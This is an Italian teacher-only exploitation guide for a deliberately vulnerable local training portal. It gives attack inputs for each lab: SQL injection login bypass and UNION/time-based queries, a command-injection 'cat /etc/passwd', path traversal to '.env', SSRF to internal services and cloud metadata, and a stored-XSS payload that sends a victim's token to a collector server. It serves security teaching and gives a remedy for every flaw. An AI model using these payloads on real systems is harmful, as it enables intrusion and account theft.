# Guida allo sfruttamento — materiale per il docente

> **Da non consegnare agli studenti.** Contiene i passaggi operativi di ogni finding.
> Se il repository viene distribuito alla classe, escludi questa cartella (`docs/docente/`) o
> consegna il portale senza di essa.
>
> Tutto gira su `127.0.0.1`. Nulla di quanto segue è applicabile a sistemi reali: l'ente, i
> dati e i servizi non esistono. Non incollare questi input in nessun sistema che non sia
> questo laboratorio.

## Stato del documento

**Bozza di M0.** Le tecniche sono standard e corrette; i **nomi dei parametri, le rotte e le
risposte** sono quelli progettati in `DESIGN.md` e vanno confermati lab per lab quando il
codice esiste (M2–M6). Ogni scheda ha un marcatore:

| Marcatore | Significato |
|---|---|
| `[progetto]` | tecnica definita, stringhe da verificare sul codice |
| `[verificato]` | provato sul portale in esecuzione |

Tutte le schede sono oggi `[progetto]`. La tabella finale tiene il conto.

## Come si legge

Per ogni finding: **prerequisiti** (che account/ruolo serve), **passi**, **input**, **cosa
osservare** (il segnale che dice che il lab è vivo), **se non funziona** (le cause tipiche),
**rimedio da spiegare** (una riga, perché la correzione si spiega a voce).

---

# Capitolo 1 — Ricognizione

## L19 — Esposizione e configurazione `[progetto]`

**Prerequisiti:** nessuno.

**Passi**

1. `GET http://127.0.0.1:8080/robots.txt` → elenca `/admin`, `/backup/`, `/legacy/`, `/debug`.
2. `GET http://127.0.0.1:8081/.git/HEAD` → `ref: refs/heads/main`.
3. Scarica l'albero con `git-dumper http://127.0.0.1:8081/.git/ ./sorgente` (o a mano leggendo
   `.git/index`). Dentro c'è il commento `// rate limit disattivato per il collaudo`.
4. `GET /backup/` → directory listing; `GET /backup/dump-2019.sql` → schema e hash MD5.
5. `GET /debug` → le ultime query eseguite, con i valori interpolati.
6. Provoca un errore (`GET /api/pratiche/abc`) → stack trace con percorsi assoluti.
7. Dal browser, `Origin: http://127.0.0.1:8026` → la risposta contiene
   `Access-Control-Allow-Origin: *`.
8. `GET /f24` in un `<iframe>` da un altro dominio → si incastra (manca `X-Frame-Options`).

**Cosa osservare:** il sorgente completo è leggibile senza credenziali; il dump del 2019 ha lo
schema vecchio (colonne diverse) — serve a distinguerlo dal DB attuale.

**Se non funziona:** verifica che il web server serva i file nascosti (in nginx serve
`location ~ /\.` **assente**: è l'errore che stiamo dimostrando).

**Rimedio da spiegare:** i file di lavoro non stanno nella document root; `robots.txt` non è
un controllo di accesso.

## L21 — Dipendenze obsolete `[progetto]`

**Prerequisiti:** un account qualsiasi (l'endpoint è sotto `/admin` ma senza controllo di ruolo).

**Passi:** `GET /admin/dipendenze` → tabella con libreria, versione, data, nota.

**Cosa osservare:** nessuna di queste librerie è realmente installata: la pagina è
documentativa. Serve a discutere il processo (chi aggiorna, chi verifica), non a sfruttare un
CVE.

**Rimedio da spiegare:** un inventario delle dipendenze che nessuno legge è peggio di nessun
inventario.

## L24 — Logging insufficiente `[progetto]`

**Prerequisiti:** un account qualsiasi.

**Passi**

1. `GET /api/admin/log` con il token di Giulia → si leggono i log di tutti (manca il controllo
   di ruolo).
2. Cerca un login fallito: non c'è. Prova a sbagliare la password dieci volte e ricontrolla.
3. Inietta: invia una richiesta con header
   `User-Agent: Mozilla/5.0" ,"path":"/api/admin/export","user":"admin` → la riga JSON si spezza
   e nel log compare una voce che non esiste.
4. Confronta l'orario del log con quello del browser: c'è lo scarto del fuso.

**Cosa osservare:** l'attacco del capitolo 4 non lascerà traccia nei log. È il finding che
regge tutto il capitolo della difesa.

**Rimedio da spiegare:** registra gli eventi di autenticazione, struttura il log (JSON
canonico, non concatenazione), scrivi in UTC, separa chi può leggerlo.

---

# Capitolo 2 — Autenticazione

## L22 — Enumerazione, rate limit, sessioni `[progetto]`

**Prerequisiti:** nessuno.

**Passi**

1. `POST /api/login` con un CF inventato → *"Codice fiscale non presente in archivio."*
2. Con il CF di Giulia e password sbagliata → *"Password non corretta."*
3. Con un CF valido e la password di un dizionario → accesso.
4. Ripeti venti volte in trenta secondi: nessun blocco, nessun ritardo, nessun CAPTCHA.
5. Apri `/sportello` con il cookie di sessione: dopo il login il cookie **non cambia**
   (session fixation).
6. Fai logout e riusa il cookie salvato: la sessione legacy è ancora valida.

**Cosa osservare:** il passo 1 e il passo 2 insieme permettono di separare l'enumerazione
degli utenti dalla ricerca della password. Il commento `// rate limit disattivato` del
capitolo 1 è la spiegazione del passo 4.

**Se non funziona:** se i messaggi sono identici, il codice ha perso la distinzione: è
l'invariante più fragile del progetto.

**Rimedio da spiegare:** messaggio unico, rate limit per utente **e** per IP, rigenerazione
dell'identificativo di sessione al login, logout che distrugge la sessione lato server.

## L10 — SQLi sul login `[progetto]`

**Prerequisiti:** nessuno.

**Passi**

1. Nel campo *Codice fiscale*: `' OR 1=1#`
2. Password: qualunque.
3. Si entra come **Mario Rossi**.

**Input**

```
codice_fiscale: ' OR 1=1#
password:       qualunque
```

**Cosa osservare:** il login esegue due query (una per l'esistenza dell'utente, una per la
password). L'iniezione ne supera entrambe. Si entra come **prima riga** della tabella, non
come amministratore: è l'invariante I1.

**Se non funziona:** se il messaggio è *"Codice fiscale non presente"*, la seconda query non
esiste e la prima non è iniettabile; se si entra come amministratore, il seed è nell'ordine
sbagliato.

**Rimedio da spiegare:** query parametriche; un solo messaggio d'errore.

## L08 — Password in MD5 `[progetto]`

**Prerequisiti:** L11 (per ottenere gli hash) oppure il dump del 2019.

**Passi**

1. Prendi l'hash di un cittadino dal dump o dalla UNION.
2. `echo -n "ciao123" | md5sum` → confronta.
3. Con un dizionario di venti voci si aprono quasi tutti gli account dei cittadini.

**Cosa osservare:** MD5 non è rotto perché "è vecchio", ma perché è veloce e senza salt: due
utenti con la stessa password hanno lo stesso hash.

**Rimedio da spiegare:** `password_hash()` (bcrypt/argon2), salt automatico, e un upgrade
trasparente al prossimo login.

## L09 — Segreti e token `[progetto]`

**Prerequisiti:** nessuno per il primo passo, un account per il secondo.

**Passi**

1. Apri `/static/app.js` (o quello che è il bundle) e cerca `apiKey`: c'è la chiave della
   **banca**, non quella che firma i token.
2. Da DevTools → Application → Local Storage, trova `token` e `cf`.
3. Decodifica il payload: `echo '<payload>' | base64 -d` → non c'è `exp`.
4. Fai logout e riusa il token: funziona ancora.

**Cosa osservare:** il token non scade e non è revocabile. È la premessa del capitolo 4: chi
lo ruba una volta lo tiene per sempre.

**Rimedio da spiegare:** chiavi fuori dal codice client; token a vita breve con refresh;
revoca server-side; `httpOnly` se si torna ai cookie.

## L17 — Recupero credenziali prevedibile e OTP debole `[progetto]`

**Prerequisiti:** nessuno.

**Passi**

1. `POST /api/recupera-password` con il CF di Giulia.
2. Apri Mailpit su `http://127.0.0.1:8025`: l'email contiene il link con il token.
3. Osserva la forma del token: è `CF + AAAAMMGG` (o simile). Genera quello di **Sara** per oggi.
4. `POST /api/rimborsi/{id}/iban` con un OTP sbagliato: la risposta non introduce ritardi né
   blocchi.
5. Con quattro cifre lo spazio è 10.000: in circa un minuto, a richieste ripetute, si trova.

**Cosa osservare:** sull'account amministrativo il recupero è **rifiutato** (`reset_disabilitato`):
è l'invariante I5, e va mostrata esplicitamente, altrimenti sembra una dimenticanza.

**Rimedio da spiegare:** token casuale ≥ 128 bit, monouso, a scadenza breve, legato all'utente;
OTP a 6 cifre con lockout e durata.

---

# Capitolo 3 — Controllo degli accessi

## L01 — IDOR in lettura `[progetto]`

**Prerequisiti:** account di Giulia (o Mario).

**Passi**

1. `GET /api/cartelle/{id}` con il proprio id → la cartella da € 1.247,00.
2. Cambia l'id (`-1`, `+1`, …) → cartelle di altri contribuenti.
3. `GET /api/pratiche/{id}` e `GET /api/rimborsi/{id}` → pratiche e rimborsi altrui, PDF incluso.

**Cosa osservare:** la risposta non è "404 per caso": il controllo di appartenenza non esiste
proprio. Con 200 contribuenti si arriva all'intero archivio un id alla volta.

**Se non funziona:** se torna 403, qualcuno ha aggiunto una policy — verifica che l'invariante
non sia stata "corretta" per errore.

**Rimedio da spiegare:** autorizzazione sulla **risorsa**, non sull'utente; id non indovinabili
aiutano ma non sostituiscono il controllo.

## L02 — IDOR in scrittura `[progetto]`

**Prerequisiti:** account di Giulia.

**Passi**

1. `PATCH /api/cartelle/{id}` con `{"importo": 0, "stato": "annullata"}` sul **proprio** id →
   l'obiettivo dichiarato del corso è raggiunto.
2. Ripeti sull'id di Mario: funziona uguale.

**Cosa osservare:** leggere è un incidente, scrivere è un reato. Il codice accetta anche
`codice_fiscale`? No: **non deve** (vedi L05), altrimenti questo endpoint diventa un secondo
modo di impersonare e il capitolo 4 perde il suo premio.

**Rimedio da spiegare:** stessa regola del L01, più la regola "il corpo della richiesta non
decide chi sono io".

## L03 — Forced browsing `[progetto]`

**Prerequisiti:** account qualsiasi.

**Passi**

1. `GET /api/admin/export` con il token di Giulia → CSV con tutti i contribuenti.
2. Confronta con `GET /api/admin/utenti`, che invece risponde 403: il middleware c'è, ma non
   su tutti gli endpoint.

**Cosa osservare:** è il difetto che spiega l'articolo del giornalista: un endpoint protetto e
uno no, nella stessa cartella di codice.

**Rimedio da spiegare:** autorizzazione dichiarativa sul gruppo di rotte, non endpoint per
endpoint.

## L04 — Path traversal `[progetto]`

**Prerequisiti:** account qualsiasi.

**Passi**

1. `GET /api/pratiche/{id}/allegato?file=documento.pdf` → il PDF.
2. `?file=../../.env` → variabili d'ambiente, comprese le credenziali del database.
3. Calcola i `../` corretti: la cartella base è `storage/app/allegati`; per arrivare a `.env`
   in radice servono tre livelli.

**Cosa osservare:** la risposta restituisce il file anche se il nome non ha estensione
ammessa.

**Rimedio da spiegare:** risolvi il percorso e verifica che resti dentro la cartella base
(`realpath` + prefisso); meglio ancora, servi gli allegati per id, non per nome.

## L05 — Mass assignment `[progetto]`

**Prerequisiti:** account di Giulia (prima parte); account funzionario (seconda parte).

**Passi — prima parte: impersonare un cittadino**

1. `PATCH /api/profilo` con `{"codice_fiscale": "RSSMRA85M01H501Z"}`.
2. `GET /api/me` → ora sei Mario, e vedi le sue pratiche senza cambiare id.

**Passi — seconda parte: promuoversi (capitolo 6)**

1. Con il token di Sara: `PATCH /sportello/utenti/{id_di_sara}` con `{"ruolo": "amministratore"}`.
2. Ricarica: il menu amministrativo compare.

**Cosa osservare:** lo stesso `$fillable` serve due controller; quello del cittadino filtra i
campi, quello dello sportello no. È l'escalation finale, e richiede di essere già funzionario.

**Rimedio da spiegare:** `$fillable` minimale, e DTO espliciti per i campi che l'utente può
davvero cambiare.

## L06 — CSRF sul cambio IBAN `[progetto]`

**Prerequisiti:** account funzionario, con la sessione cookie del modulo legacy attiva.

**Passi**

1. Su `esca` c'è la pagina `csrf.html`: un form che fa `POST` a
   `/sportello/rimborso/{id}/iban` con `iban=IT00X0000000000000000000000`.
2. Con la sessione aperta, apri quella pagina e premi il pulsante.
3. Il rimborso ora punta altrove, senza che l'utente abbia fatto nulla di strano.

**Cosa osservare:** funziona **solo** sul modulo legacy, perché usa il cookie. Sulla SPA, con
il Bearer, lo stesso attacco non funziona. È la lezione sul perché il modello di credenziale
cambia il modello di minaccia.

**Rimedio da spiegare:** token anti-CSRF per sessione, `SameSite=Lax` o `Strict`, verifica
dell'`Origin`.

## L07 — Open redirect `[progetto]`

**Prerequisiti:** nessuno.

**Passi:** `GET /sportello/entra?ritorno=https://example.org` → `Location:
https://example.org`, con l'aspetto di un link del portale.

**Cosa osservare:** su un sito istituzionale serve al phishing: il dominio nell'indirizzo è
quello giusto, la destinazione no.

**Rimedio da spiegare:** lista di destinazioni ammesse, o solo percorsi relativi.

## L23 — Deserializzazione insicura `[progetto]`

**Prerequisiti:** account di Giulia.

**Passi**

1. `POST /api/profilo/preferenze` con `{"preferenze": "<base64>"}`.
2. Manda un oggetto qualsiasi: l'errore rivela che il contenuto è passato a `unserialize()`.
3. Con la classe che il codice istanzia (quella che genera il report), costruisci l'oggetto che
   nel distruttore scrive un file in una cartella scelta.

**Cosa osservare:** non è "input non validato": è un **formato** che permette di costruire
oggetti. Il pericolo sta nei metodi magici, non nei dati.

**Rimedio da spiegare:** `json_decode` invece di `unserialize`; se serve serializzare, firma il
payload e usa una whitelist di classi.

## L26 — Upload non sicuro `[progetto]`

**Prerequisiti:** account qualsiasi.

**Passi**

1. Carica `prova.png` (accettato).
2. Carica `prova.html` rinominandolo con `Content-Type: image/png`: viene accettato.
3. `GET /storage/allegati/prova.html` → il browser lo interpreta come pagina, non come immagine.

**Cosa osservare:** il controllo guarda quello che il client **dichiara**, non quello che il
file contiene.

**Rimedio da spiegare:** whitelist di estensioni e MIME reali, rinomina, `Content-Disposition:
attachment`, servizio da un dominio separato.

---

# Capitolo 4 — XSS e furto del token

> Il capitolo si gioca in due finestre: una normale (attaccante) e una **in incognito** (Sara).
> Chiudi quella in incognito solo alla fine.

## L14 — XSS riflesso `[progetto]`

**Prerequisiti:** nessuno (il modulo contatti è pubblico).

**Passi**

1. Apri "Scrivi all'ufficio".
2. Invia `<img src=x onerror=alert(document.domain)>`.

**Cosa osservare:** lo script gira nel contesto del portale, non in quello dell'utente. Con
`document.cookie` si legge il cookie di sessione del modulo legacy: manca `HttpOnly`.

**Se non funziona:** se il testo appare "sporco", qualcuno ha cambiato `{!! !!}` in `{{ }}`.

**Rimedio da spiegare:** escape in uscita, non in entrata; CSP come seconda linea.

## L15 — XSS stored e furto del token `[progetto]`

**Prerequisiti:** due finestre; la vittima è la finestra in incognito con l'account di Sara.

**Passi**

1. Nella finestra normale sei Giulia: apri la **tua** pratica e aggiungi una nota con il payload.
   La nota è un'"integrazione alla pratica", funzione che il cittadino ha davvero.
2. Sara, quando lavora la tua pratica, apre la stessa pagina nel modulo sportello e la nota
   viene resa come HTML.
3. Payload:

```html
<img src=x onerror="fetch('http://127.0.0.1:8026/c?t='+encodeURIComponent(localStorage.getItem('token'))+'&cf='+encodeURIComponent(localStorage.getItem('cf')))">
```

4. Nella finestra in incognito, entra come Sara e apri la pratica: l'immagine parte, il token
   arriva su `esca`.
5. Apri `http://127.0.0.1:8026` e copia il token.
6. Nella finestra normale: DevTools → Application → Local Storage, sostituisci `token`, ricarica.

**Cosa osservare:** Sara non ha cliccato niente di strano: ha aperto una pratica. La differenza
tra XSS riflesso e stored è che la vittima non deve fare nulla.

**Se non funziona:** controlla che `esca` sia raggiungibile dal browser (`127.0.0.1:8026`) e che
il payload non venga salvato escapato (`{!! !!}`).

**Rimedio da spiegare:** sanitizzazione con whitelist (HTML purifier), CSP, e soprattutto:
perché un token rubabile vale l'intero account.

## L16 — XSS DOM `[progetto]`

**Prerequisiti:** nessuno.

**Passi**

1. `GET /accedi?torna=<img src=x onerror=alert(1)>`.
2. Lo script gira senza che nulla passi dal server: guarda il codice della SPA, la riga con
   `innerHTML`.

**Cosa osservare:** nei log del server la richiesta non contiene nulla di sospetto — l'ha
eseguita il client. È il finding che dimostra perché i filtri lato server non bastano.

**Rimedio da spiegare:** `textContent` invece di `innerHTML`; sanitizzazione lato client.

---

# Capitolo 5 — Iniezione

## L11 — UNION e information disclosure `[progetto]`

**Prerequisiti:** account **funzionario** (la ricerca pratiche è nello sportello).

**Passi**

1. Individua il numero di colonne: `?cf=' ORDER BY 6-- -` (nessun errore) e `ORDER BY 7-- -`
   (errore).
2. `?cf=' UNION SELECT 1,2,3,4,5,6-- -` → quali numeri compaiono in pagina? Quelli sono le
   colonne renderizzate.
3. Sostituisci con `codice_fiscale, nome, cognome, email, password, ruolo FROM utenti` →
   dump degli hash.
4. `?sort=id,` → errore SQL in pagina con la query completa.

**Cosa osservare:** il passo 4 è la tecnica più realistica: l'iniezione su un **identificatore**
(`ORDER BY`) non è parametrizzabile nemmeno con i prepared statement, e qui l'errore racconta
lo schema.

**Rimedio da spiegare:** valori → parametri; identificatori → whitelist esplicita; errori
dettagliati solo in sviluppo.

## L12 — Blind e time-based `[progetto]`

**Prerequisiti:** nessuno (l'endpoint di verifica è pubblico).

**Passi**

1. `?protocollo=2025/0001234` → "Pratica in lavorazione".
2. `?protocollo=9999' AND '1'='1` → ancora "in lavorazione" (vero).
3. `?protocollo=9999' AND '1'='2` → "Protocollo non trovato" (falso).
4. `?protocollo=9999' OR SLEEP(3)-- -` → la risposta arriva dopo tre secondi.

**Cosa osservare:** il passo 3 è la macchina binaria: una condizione vera/falsa. Il passo 4 non
richiede che la risposta cambi, solo che arrivi tardi — e regge anche quando il messaggio è
sempre identico.

**Se non funziona:** con `AND SLEEP()` su una riga che non esiste il ritardo non si vede:
serve `OR SLEEP()`.

**Rimedio da spiegare:** query parametriche; il tempo di risposta è un canale come un altro.

## L13 — Command injection `[progetto]`

**Prerequisiti:** funzionario.

**Passi**

1. Genera il PDF di una pratica: `POST /sportello/report` con `{"pratica": 118}`.
2. Prova `{"pratica": "118;id"}` → l'output del comando compare nel messaggio di errore.
3. `"118;cat /etc/passwd"` per convincersene.

**Cosa osservare:** il convertitore è invocato con `exec()` e gli argomenti sono concatenati.
È il classico difetto di un'integrazione scritta in fretta.

**Rimedio da spiegare:** niente shell; API della libreria; se serve la shell, array di argomenti
e valori validati.

---

# Capitolo 6 — Soldi e perimetro

## L18 — Race condition sul rimborso `[progetto]`

**Prerequisiti:** account cittadino con un rimborso in stato richiedibile.

**Passi**

1. Una richiesta normale → `202`, stato `richiesto`.
2. Due richieste **simultanee** → due rimborsi.

```bash
# solo dal docente, sul proprio laboratorio
for i in 1 2; do
  curl -s -X POST "http://127.0.0.1:8081/api/rimborsi/12/richiedi" \
       -H "Authorization: Bearer $TOKEN" &
done; wait
```

**Cosa osservare:** la finestra è il tempo tra il controllo "già richiesto?" e la scrittura.
Se il seeder ha finestre di pochi millisecondi, allarga il delay solo per la demo e rimettilo
a posto dopo.

**Rimedio da spiegare:** transazione con lock o vincolo di unicità sul database — il controllo
applicativo non basta mai.

## L06/L05 — Escalation (vedi capitolo 3)

## L25 — SSRF `[progetto]`

**Prerequisiti:** account qualsiasi.

**Passi**

1. `POST /api/allegati/da-url` con `{"url": "http://banca:8080/health"}` → risponde.
2. `{"url": "http://anagrafe:8080/cittadini"}` → l'archivio vero.
3. `{"url": "http://admin:admin@anagrafe:8080/cittadini"}` → credenziali predefinite passate
   nell'URL, onorate dal client HTTP.
4. `{"url": "file:///var/www/html/.env"}` → variabili d'ambiente del portale.
5. `{"url": "http://169.254.169.254/latest/meta-data/"}` → il classico bersaglio cloud (qui non
   risponde: serve a spiegare dove si andrebbe in un ambiente reale).

**Cosa osservare:** i servizi interni non hanno `ports:` e dal browser non esistono. Il punto
del capitolo: *"non era esposto su Internet, era esposto a voi."*

**Se non funziona:** se il client HTTP non onora le credenziali nell'URL, aggiungi un header
`Authorization` all'endpoint — e annotalo come variante verificata.

**Rimedio da spiegare:** whitelist di destinazioni, risoluzione DNS e blocco degli IP privati,
niente `file://`, rete segmentata.

## L20 — Credenziali predefinite sull'anagrafe `[progetto]`

**Prerequisiti:** L25.

**Passi:** con l'URL autenticato del L25 si ottiene il dump completo; `admin/admin` compare
anche nella pagina di login del pannello, raggiungibile via SSRF.

**Cosa osservare:** il servizio interno è protetto dall'esterno, non dagli attacchi.

**Rimedio da spiegare:** nessuna credenziale predefinita; l'accesso interno si autentica come
quello esterno.

---

# La catena completa, in trenta minuti

Utile per la dimostrazione introduttiva del corso:

1. `robots.txt` → `/.git` → leggo il `// TODO` sul rate limit. *(L19)*
2. `' OR 1=1#` sul login → sono Mario, che non sono io. *(L10)*
3. Cambio l'id → la cartella di Giulia. *(L01)*
4. `PATCH` sull'id mio → il mio debito sparisce. *(L02)*
5. Nota con payload sulla pratica di Sara → apro l'incognito, Sara apre la pratica, il token
   arriva su `esca`. *(L15)*
6. Con il token di Sara: `PATCH /sportello/utenti/{id}` con `ruolo: amministratore`. *(L05)*
7. `GET /api/admin/export` e infine la SSRF verso l'anagrafe. *(L03, L25)*

---

# Prima di ogni lezione

| Controllo | Comando / azione |
|---|---|
| Stack su | `docker compose ps` → sette servizi `running` |
| Stato pulito | `docker compose exec api php artisan lab:reset` |
| Portale | `http://127.0.0.1:8080` risponde |
| API | `http://127.0.0.1:8081/api/health` risponde |
| Posta | `http://127.0.0.1:8025` mostra la casella |
| Esplosivo | `http://127.0.0.1:8026` è vuoto (nessun token residuo) |
| Invariante I1 | `' OR 1=1#` → **Mario Rossi**, non amministratore |
| Invariante I3 | la password del funzionario non è nel dizionario |
| Invariante I5 | il reset sull'admin è rifiutato |

Se uno di questi controlli non torna, il laboratorio è rotto e va ripristinato **prima** di far
entrare la classe: un lab che non funziona in aula costa più di uno che non c'è.

---

# Tabella di stato

| Lab | Tecnica | Stato |
|---|---|---|
| L01 | IDOR lettura | `[progetto]` |
| L02 | IDOR scrittura | `[progetto]` |
| L03 | Forced browsing | `[progetto]` |
| L04 | Path traversal | `[progetto]` |
| L05 | Mass assignment (×2) | `[progetto]` |
| L06 | CSRF | `[progetto]` |
| L07 | Open redirect | `[progetto]` |
| L08 | MD5 | `[progetto]` |
| L09 | Segreti e token | `[progetto]` |
| L10 | SQLi login | `[progetto]` |
| L11 | UNION + error-based | `[progetto]` |
| L12 | Blind + time-based | `[progetto]` |
| L13 | Command injection | `[progetto]` |
| L14 | XSS riflesso | `[progetto]` |
| L15 | XSS stored + furto token | `[progetto]` |
| L16 | XSS DOM | `[progetto]` |
| L17 | Reset prevedibile + OTP | `[progetto]` |
| L18 | Race condition | `[progetto]` |
| L19 | Configurazione ed esposizione | `[progetto]` |
| L20 | Credenziali predefinite | `[progetto]` |
| L21 | Dipendenze obsolete | `[progetto]` |
| L22 | Autenticazione e sessioni | `[progetto]` |
| L23 | Deserializzazione | `[progetto]` |
| L24 | Logging | `[progetto]` |
| L25 | SSRF | `[progetto]` |
| L26 | Upload | `[progetto]` |

Il marcatore diventa `[verificato]` quando la scheda è stata provata sul portale in esecuzione,
insieme al codice del lab (M2–M6).
